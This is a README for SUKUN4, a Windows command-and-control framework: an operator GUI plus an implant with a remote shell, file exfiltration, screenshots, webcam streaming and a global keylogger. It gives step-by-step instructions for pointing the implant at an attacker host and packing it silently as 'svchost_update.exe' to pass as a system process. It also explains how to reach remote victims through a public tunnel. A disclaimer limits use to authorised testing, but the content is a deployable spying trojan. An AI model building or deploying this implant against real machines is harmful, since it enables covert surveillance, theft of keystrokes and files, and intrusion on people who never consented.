# SUKUN4

> c2 operator console — windows implant + gui listener

[![python](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/)
[![platform](https://img.shields.io/badge/platform-windows-lightgrey)](https://www.microsoft.com/windows)
[![license](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![version](https://img.shields.io/badge/version-1.1.0-purple)](CHANGELOG.md)

SUKUN4 is a lab C2 framework for Windows. A Tk GUI operator console with banner, live webcam panel, and color-tagged output, plus a single-file Windows implant with shell, file transfer, capture, keylog, and desktop control.

**For use only on systems you own or have explicit written permission to test.** See [Legal](#legal).

---

## features

- **gui console** — banner panel, live webcam panel, color-tagged output, command entry, per-session title bar
- **shell** — run any Windows command, tracked working directory
- **persistent shell** — long-lived `cmd.exe` with state across commands
- **file transfer** — `dir`, `get`, `put`, `zip`
- **background jobs** — `bg`, `jobs`, `job_out`, `job_kill`
- **streaming output** — `stream <cmd>`
- **screenshot** — multi-monitor PNG
- **live webcam** — in-window video, fps/drop status, `webcam_stream <sec> <fps>`
- **keylogger** — global keyboard hook
- **wallpaper** — set/restore, auto-converts to BMP

---

## quickstart

### attacker
git clone https://github.com/<you>/SUKUN4.git
cd SUKUN4
python -m venv .venv
..venv\Scripts\Activate.ps1
pip install -r requirements-attacker.txt
python attacker.py

text

A window titled **SUKUN4** opens: banner at top, live webcam panel (hidden until `webcam_stream`), color-tagged output in the middle, command entry at the bottom. The title bar shows the current session host.

### implant

Edit `implant.py`:
C2_HOST = "192.168.1.50" # attacker LAN IP, or tunnel host
C2_PORT = 54321 # must match PORT in attacker.py

text

Build:
..venv\Scripts\pip install -r requirements-implant.txt
..venv\Scripts\python.exe -m PyInstaller --onefile --noconsole --name svchost_update ^
--hidden-import PIL.ImageGrab --collect-all PIL ^
--hidden-import cv2 --collect-all cv2 ^
implant.py

text

Output: `dist\svchost_update.exe`. Copy to target, launch, wait for `session <ip>:<port> open` in the GUI.

### testing over the internet

Same-LAN `C2_HOST` values (`192.168.x.x`) do not route across networks. For a remote target, forward a local TCP port with a tunnel and point `C2_HOST` / `C2_PORT` at the tunnel's public host:port. `bore local 54321 --to bore.pub` prints a `listening at bore.pub:PORT` line — that pair is the build-time endpoint. The port rotates per tunnel restart.

---

## commands

| command | description |
|---|---|
| `shell <cmd>` | run a command in the tracked cwd |
| `cd <dir>` / `cwd` | change / show working directory |
| `bg <cmd>` / `jobs` / `job_out <id>` / `job_kill <id>` | background jobs |
| `shell_open` / `shell_send <text>` / `shell_close` | persistent cmd.exe |
| `stream <cmd>` | streaming output |
| `dir [path]` | directory listing with sizes |
| `get <remote>` | download a file |
| `zip <remote>` | download a dir/file as .zip |
| `put "<local>" "<remote>"` | upload a file |
| `screenshot` | multi-monitor PNG |
| `webcam` / `webcam_stream <sec> <fps>` / `webcam_stop` | capture |
| `keylog_dump` / `keylog_clear` | keylogger |
| `wallpaper "<local>"` / `wallpaper_restore` | desktop |
| `help` / `exit` | — |

---

## layout
SUKUN4/
├── attacker.py # GUI listener
├── implant.py # windows client
├── banner.py # console branding
├── VERSION # version string
├── requirements-attacker.txt
├── requirements-implant.txt
├── build/windows/
│ ├── client_version.txt # exe metadata
│ └── admin.manifest # optional elevation
├── .github/workflows/lint.yml
└── loot/ # captured output (gitignored)

text

---

## license

MIT. See [LICENSE](LICENSE).

## legal

SUKUN4 is a **lab tool**. Using it against systems you do not own, or do not have **explicit written permission** to test, is a criminal offense in nearly every jurisdiction. The author assumes no liability for misuse. Test your own machines. Get client scope in writing before testing a client environment.

---

*built by thuli_0x*
